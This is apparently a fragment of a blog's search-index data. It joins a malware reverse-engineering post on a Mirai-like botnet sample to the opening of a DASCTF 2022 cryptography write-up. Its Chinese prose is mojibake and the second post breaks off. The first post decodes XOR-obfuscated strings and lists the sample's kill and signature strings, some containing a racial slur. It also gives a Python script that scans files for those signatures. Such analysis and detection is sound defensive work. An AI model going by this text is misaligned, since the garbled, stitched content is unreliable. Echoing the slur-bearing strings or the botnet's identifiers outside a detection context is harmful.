0x22, 0x00, 0x4C, 0x43, 0x4F, 0x47, 0x51, 0x47, 0x50, 0x54, 0x47, 0x50, 0x02, 0x22, 0x00, 0x61, 0x4D, 0x4C, 0x4C, 0x47, 0x41, 0x56, 0x4B, 0x4D, 0x4C, 0x18, 0x02, 0x49, 0x47, 0x47, 0x52, 0x0F, 0x43, 0x4E, 0x4B, 0x54, 0x47, 0x22, 0x00, 0x51, 0x47, 0x56, 0x61, 0x4D, 0x4D, 0x49, 0x4B, 0x47, 0x0A, 0x05, 0x22, 0x00, 0x50, 0x47, 0x44, 0x50, 0x47, 0x51, 0x4A, 0x18, 0x22, 0x00, 0x4E, 0x4D, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x18, 0x22, 0x00, 0x51, 0x47, 0x56, 0x0F, 0x41, 0x4D, 0x4D, 0x49, 0x4B, 0x47, 0x18, 0x22, 0x00, 0x41, 0x4D, 0x4C, 0x56, 0x47, 0x4C, 0x56, 0x0F, 0x4E, 0x47, 0x4C, 0x45, 0x56, 0x4A, 0x18, 0x22, 0x00, 0x56, 0x50, 0x43, 0x4C, 0x51, 0x44, 0x47, 0x50, 0x0F, 0x47, 0x4C, 0x41, 0x4D, 0x46, 0x4B, 0x4C, 0x45, 0x18, 0x22, 0x00, 0x41, 0x4A, 0x57, 0x4C, 0x49, 0x47, 0x46, 0x22, 0x00, 0x41, 0x4D, 0x4C, 0x4C, 0x47, 0x41, 0x56, 0x4B, 0x4D, 0x4C, 0x18, 0x22, 0x00, 0x51, 0x47, 0x50, 0x54, 0x47, 0x50, 0x18, 0x02, 0x46, 0x4D, 0x51, 0x43, 0x50, 0x50, 0x47, 0x51, 0x56, 0x22, 0x00, 0x51, 0x47, 0x50, 0x54, 0x47, 0x50, 0x18, 0x02, 0x41, 0x4E, 0x4D, 0x57, 0x46, 0x44, 0x4E, 0x43, 0x50, 0x47, 0x0F, 0x4C, 0x45, 0x4B, 0x4C, 0x5A, 0x22, 0x00, 0x43, 0x51, 0x51, 0x55, 0x4D, 0x50, 0x46, 0x22, 0x00, 0x4D, 0x45, 0x4B, 0x4C, 0x22, 0x00, 0x47, 0x4C, 0x56, 0x47, 0x50, 0x22, 0x00, 0x46, 0x49, 0x43, 0x4D, 0x55, 0x48, 0x44, 0x4B, 0x50, 0x4A, 0x4B, 0x43, 0x46, 0x13, 0x48, 0x11, 0x47, 0x46, 0x48, 0x49, 0x43, 0x4B, 0x22, 0x00, 0x00, 0x00, 0x63, 0x41, 0x41, 0x47, 0x52, 0x56, 0x18, 0x02, 0x56, 0x47, 0x5A, 0x56, 0x0D, 0x4A, 0x56, 0x4F, 0x4E, 0x0E, 0x43, 0x52, 0x52, 0x4E, 0x4B, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x0D, 0x5A, 0x4A, 0x56, 0x4F, 0x4E, 0x09, 0x5A, 0x4F, 0x4E, 0x0E, 0x43, 0x52, 0x52, 0x4E, 0x4B, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x0D, 0x5A, 0x4F, 0x4E, 0x19, 0x53, 0x1F, 0x12, 0x0C, 0x1B, 0x0E, 0x4B, 0x4F, 0x43, 0x45, 0x47, 0x0D, 0x55, 0x47, 0x40, 0x52, 0x0E, 0x08, 0x0D, 0x08, 0x19, 0x53, 0x1F, 0x12, 0x0C, 0x1A, 0x22, 0x00, 0x63, 0x41, 0x41, 0x47, 0x52, 0x56, 0x0F, 0x6E, 0x43, 0x4C, 0x45, 0x57, 0x43, 0x45, 0x47, 0x18, 0x02, 0x47, 0x4C, 0x0F, 0x77, 0x71, 0x0E, 0x47, 0x4C, 0x19, 0x53, 0x1F, 0x12, 0x0C, 0x1A, 0x22, 0x00, 0x00, 0x00, 0x00, 0x61, 0x4D, 0x4C, 0x56, 0x47, 0x4C, 0x56, 0x0F, 0x76, 0x5B, 0x52, 0x47, 0x18, 0x02, 0x43, 0x52, 0x52, 0x4E, 0x4B, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x0D, 0x5A, 0x0F, 0x55, 0x55, 0x55, 0x0F, 0x44, 0x4D, 0x50, 0x4F, 0x0F, 0x57, 0x50, 0x4E, 0x47, 0x4C, 0x41, 0x4D, 0x46, 0x47, 0x46, 0x22, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x13, 0x12, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x13, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x12, 0x16, 0x0C, 0x13, 0x12, 0x11, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x13, 0x12, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x10, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x16, 0x11, 0x0C, 0x13, 0x13, 0x14, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x13, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x12, 0x16, 0x0C, 0x13, 0x12, 0x11, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x10, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x16, 0x11, 0x0C, 0x13, 0x13, 0x14, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x7D, 0x13, 0x13, 0x7D, 0x14, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x14, 0x12, 0x13, 0x0C, 0x15, 0x0C, 0x15, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x74, 0x47, 0x50, 0x51, 0x4B, 0x4D, 0x4C, 0x0D, 0x1B, 0x0C, 0x13, 0x0C, 0x10, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x14, 0x12, 0x13, 0x0C, 0x15, 0x0C, 0x15, 0x22, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x17, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x17, 0x0C, 0x12, 0x0B, 0x22, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x12, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x16, 0x0C, 0x12, 0x19, 0x02, 0x65, 0x76, 0x60, 0x15, 0x0C, 0x16, 0x19, 0x02, 0x6B, 0x4C, 0x44, 0x4D, 0x72, 0x43, 0x56, 0x4A, 0x0C, 0x11, 0x19, 0x02, 0x71, 0x74, 0x13, 0x19, 0x02, 0x0C, 0x6C, 0x67, 0x76, 0x02, 0x61, 0x6E, 0x70, 0x02, 0x11, 0x0C, 0x16, 0x0C, 0x17, 0x11, 0x11, 0x14, 0x12, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x19, 0x02, 0x47, 0x4C, 0x0F, 0x77, 0x71, 0x0B, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x16, 0x0C, 0x12, 0x19, 0x02, 0x64, 0x66, 0x6F, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x61, 0x50, 0x43, 0x55, 0x4E, 0x47, 0x50, 0x19, 0x02, 0x6F, 0x47, 0x46, 0x4B, 0x43, 0x02, 0x61, 0x47, 0x4C, 0x56, 0x47, 0x50, 0x02, 0x72, 0x61, 0x02, 0x17, 0x0C, 0x12, 0x0B, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x16, 0x0C, 0x12, 0x19, 0x02, 0x65, 0x76, 0x60, 0x15, 0x0C, 0x16, 0x19, 0x02, 0x6B, 0x4C, 0x44, 0x4D, 0x72, 0x43, 0x56, 0x4A, 0x0C, 0x10, 0x19, 0x02, 0x71, 0x74, 0x13, 0x19, 0x02, 0x0C, 0x6C, 0x67, 0x76, 0x02, 0x61, 0x6E, 0x70, 0x02, 0x16, 0x0C, 0x16, 0x0C, 0x17, 0x1A, 0x15, 0x1B, 0x1B, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x19, 0x02, 0x47, 0x4C, 0x0F, 0x77, 0x71, 0x0B, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x17, 0x0C, 0x12, 0x19, 0x02, 0x64, 0x57, 0x4C, 0x75, 0x47, 0x40, 0x72, 0x50, 0x4D, 0x46, 0x57, 0x41, 0x56, 0x51, 0x0B, 0x22, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x0C, 0x14, 0x19, 0x02, 0x50, 0x54, 0x18, 0x10, 0x17, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x10, 0x17, 0x0C, 0x12, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x0C, 0x1A, 0x19, 0x02, 0x50, 0x54, 0x18, 0x10, 0x13, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x10, 0x13, 0x0C, 0x12, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x0C, 0x1A, 0x19, 0x02, 0x50, 0x54, 0x18, 0x10, 0x16, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x10, 0x16, 0x0C, 0x12, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x7D, 0x13, 0x12, 0x19, 0x02, 0x50, 0x54, 0x18, 0x11, 0x11, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x11, 0x11, 0x0C, 0x12, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x13, 0x12, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x14, 0x16, 0x19, 0x02, 0x5A, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x14, 0x10, 0x0C, 0x12, 0x0C, 0x11, 0x10, 0x12, 0x10, 0x0C, 0x1B, 0x16, 0x22, 0x00, 0x00, 0x00]#lsit1 = [&#x27;0&#x27;, &#x27;3&#x27;, &#x27;16&#x27;, &#x27;19&#x27;, &#x27;35&#x27;, &#x27;43&#x27;, &#x27;49&#x27;, &#x27;61&#x27;, &#x27;66&#x27;, &#x27;74&#x27;, &#x27;83&#x27;, &#x27;94&#x27;, &#x27;106&#x27;, &#x27;122&#x27;, &#x27;139&#x27;, &#x27;154&#x27;, &#x27;166&#x27;, &#x27;172&#x27;, &#x27;178&#x27;, &#x27;195&#x27;, &#x27;210&#x27;, &#x27;220&#x27;, &#x27;240&#x27;, &#x27;264&#x27;, &#x27;279&#x27;, &#x27;299&#x27;, &#x27;323&#x27;, &#x27;339&#x27;, &#x27;348&#x27;, &#x27;360&#x27;, &#x27;370&#x27;, &#x27;377&#x27;, &#x27;383&#x27;, &#x27;394&#x27;, &#x27;411&#x27;, &#x27;422&#x27;, &#x27;428&#x27;, &#x27;434&#x27;, &#x27;440&#x27;, &#x27;447&#x27;, &#x27;455&#x27;, &#x27;463&#x27;, &#x27;467&#x27;, &#x27;486&#x27;, &#x27;510&#x27;, &#x27;520&#x27;]#list2 = [&#x27;2&#x27;, &#x27;12&#x27;, &#x27;2&#x27;, &#x27;29&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;11&#x27;, &#x27;4&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;10&#x27;, &#x27;11&#x27;, &#x27;15&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;11&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;9&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;14&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;15&#x27;, &#x27;8&#x27;, &#x27;11&#x27;, &#x27;9&#x27;, &#x27;6&#x27;, &#x27;5&#x27;, &#x27;10&#x27;, &#x27;15&#x27;, &#x27;10&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;7&#x27;, &#x27;3&#x27;, &#x27;18&#x27;, &#x27;23&#x27;, &#x27;9&#x27;, &#x27;16&#x27;]def func1(): msg_str = &quot;&quot; for _ in cipher1: char = chr(_ ^ 34) if char == &quot;\\0&quot;: msg_str = msg_str + &quot;0&quot; else: msg_str = msg_str + char length = len(list1) for _ in range(length): print(msg_str[int(list1[_]):int(list1[_])+int(list2[_])])if __name__ == &quot;__main__&quot;: func1() è¿™æ ·å°±å¾—åˆ°äº†è¡¨æ ¼æ¯é¡¹çš„æ•°æ®ï¼Œå†æŠŠæºç çš„è¡¨æ ¼è§£å¯†ä¸€ä¸‹ï¼Œä¸¤è¾¹çš„æ•°æ®é¡ºåºå¤§è‡´ä¸Šæ˜¯å¯¹å¾—ä¸Šçš„ å¤šä½™çš„éƒ¨åˆ†åŸºæœ¬ä¸Šå°±æ˜¯å­—ç¬¦ä¸²KILLç‰¹å¾äº†ï¼Œç‰¹å¾å¦‚ä¸‹ 12345678910111213141516171819202122232425262728dvrHelper\\x00NiGGeR69xd\\x001337SoraLOADER\\x00NiGGeRd0nks1337\\x00X19I239124UIU\\x00IuYgujeIqn\\x0014Fa\\x00ccAD\\x00&#x2F;proc&#x2F;net&#x2F;route\\x00&#x2F;proc&#x2F;cpuinfo\\x00BOGOMIPS\\x00&#x2F;etc&#x2F;rc.d&#x2F;rc.local\\x00g1abc4dmo35hnp2lie0kjf\\x00&#x2F;dev&#x2F;watchdog\\x00&#x2F;dev&#x2F;misc&#x2F;watchdog\\x00&#x2F;dev&#x2F;FTWDT101_watchdog\\x00&#x2F;dev&#x2F;netslink&#x2F;\\x00PRIVMSG\\x00GETLOCALIP\\x00KILLATTK\\x00Eats8\\x00v[0v\\x0093OfjHZ2z\\x00GhostWuzHere666WsGA4@F6F\\x00ACDB\\x00AbAd\\x00iaGv\\x00 BTWï¼šè‹¥å‡ºç°\\x00åˆ™ä¸ºå¿…è¦çš„ï¼ŒCè¯­è¨€ç¨‹åºä¸­è¾“å‡º&quot;KEY{dvrHelper}&quot;ä¸ä¼šè§¦å‘KILLæœºåˆ¶ï¼Œè¾“å‡º&quot;dvrHelper&quot;åˆ™ä¼š ä½†æ˜¯è¿˜æ˜¯è¦éªŒè¯ä¸€ä¸‹ 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void main()&#123; FILE *fp; char *res; system(&quot;xxd ./kill_me | grep dvr -A 1&quot;); printf(&quot;\\n&quot;); printf(&quot;Kill_me_KEY is :dvrHelper&quot;); while(1) &#123; printf(&quot;\\n&quot;); printf(&quot;I&#x27;m alive at &quot;); fp = popen(&quot;date&quot;, &quot;r&quot;); while(fgets(res, sizeof(res), fp) != NULL) &#123; printf(&quot;%s&quot;, res); &#125; pclose(fp); sleep(10); &#125;&#125; ç…§è¿™æ ·æ¯ä¸ªå­—ç¬¦ä¸²éƒ½è¿‡ä¸€é å¯ä»¥ç¡®å®šä¸Šæ–‡éƒ¨åˆ†çš„ç‰¹å¾éƒ½ä¸ºå­—ç¬¦ä¸²KILLç‰¹å¾ KEY_in_HIDS 12345678910111213141516171819202122232425262728293031323334353637383940import binasciiimport rekey = [&quot;dvrHelper&quot;, &quot;NiGGeR69xd&quot;, &quot;1337SoraLOADER&quot;, &quot;NiGGeRd0nks1337&quot;, &quot;X19I239124UIU&quot;, &quot;IuYgujeIqn&quot;, &quot;14Fa&quot;, &quot;ccAD&quot;, &quot;/proc/net/route&quot;, &quot;/proc/cpuinfo&quot;, &quot;BOGOMIPS&quot;, &quot;/etc/rc.d/rc.local&quot;, &quot;g1abc4dmo35hnp2lie0kjf&quot;, &quot;/dev/watchdog&quot;, &quot;/dev/misc/watchdog&quot;, &quot;/dev/FTWDT101_watchdog&quot;, &quot;/dev/netslink/&quot;, &quot;PRIVMSG&quot;, &quot;GETLOCALIP&quot;, &quot;KILLATTK&quot;, &quot;Eats8&quot;, &quot;v[0v&quot;, &quot;93OfjHZ2z&quot;, &quot;GhostWuzHere666&quot;, &quot;WsGA4@F6F&quot;, &quot;ACDB&quot;, &quot;AbAd&quot;, &quot;iaGv&quot;]f = open(&quot;/usr/local/[DATA_EXPUNGED]&quot;, &quot;rb&quot;)data = f.read()f.close()data = binascii.hexlify(data).decode()for _ in key: hex_key = binascii.hexlify(_.encode()).decode() find_list = re.findall(hex_key, data) if find_list != []: print(_) å†™ä»½æŠ¥å‘Šå°±èƒ½äº¤å·®äº†","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"Malware","slug":"Malware","permalink":"https://yoloyolo.top/tags/Malware/"}]},{"title":"DASCTF_MAY_2022","slug":"DASCTF-MAY-2022","date":"2022-05-22T02:11:59.000Z","updated":"2022-06-27T18:30:18.000Z","comments":true,"path":"2022/05/21/DASCTF-MAY-2022/","link":"","permalink":"https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/","excerpt":"è€æ ·å­ï¼Œèµ›åè§£é¢˜","text":"è€æ ·å­ï¼Œèµ›åè§£é¢˜ Yusaçš„å¯†ç å­¦è¯¾å ‚â€”â€”ä¸€è§å¦‚æ•… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Myrand(): def __init__(self,seed): self.index = 0 self.isInit = 1 self.MT = [seed] + [0] * 623 for i in range(1,624): t = 1314433253 * (self.MT[i-1] ^ (self.MT[i-1] &gt;&gt; 30)) + 1 self.MT[i] = t &amp; 0xffffffff def generate(self): for i in range(624): y = (self.MT[i] &amp; 0x80000000) + (self.MT[(i+1)%624] &amp; 0x7fffffff) self.MT[i] = self.MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: self.MT[i] ^= 2567483520 def rand(self): if self.index == 0: self.generate() y = self.MT[self.index] y = y ^ self.cs2l(y, 11) ^ self.cs2l(y, 15) y = y ^ self.cs2r(y, 7) ^ self.cs2r(y, 19) self.index = (self.index + 1) % 624 return y def cs2l(self, y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(self, y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffimport osr = Myrand(int(os.urandom(4).hex(),16))out = []for i in range(624): out.append(r.rand())with open(&quot;output.txt&quot;,&quot;w&quot;) as f: f.write(str(out))from hashlib import md5flag = &#x27;DASCTF&#123;&#x27; + md5(str(r.rand()).encode()).hexdigest() + &#x27;&#125;&#x27;print(flag) å‡½æ•°__init__(self,seed)ç”¨äºåˆå§‹åŒ– å‡½æ•°rand(self)ä¸ºä¸»è¦å‡½æ•° å‡½æ•°generate(self)ç”¨äºå½“indexä¸º0æ—¶é‡æ–°ç”Ÿæˆåˆ—è¡¨MT å‡½æ•°cs2l(self, y, shift)ç”¨äºå°†yæŒ‰bitå¾ªç¯å·¦ç§»shiftä½ å‡½æ•°cs2r(self, y, shift)ç”¨äºå°†yæŒ‰bitå¾ªç¯å³ç§»shiftä½ ç”±äºæ˜¯å…ˆç”Ÿæˆäº†624ä¸ªéšæœºæ•°ï¼Œå³éå†äº†ä¸€éåˆ—è¡¨MTï¼Œå†ç”Ÿæˆäº†flag 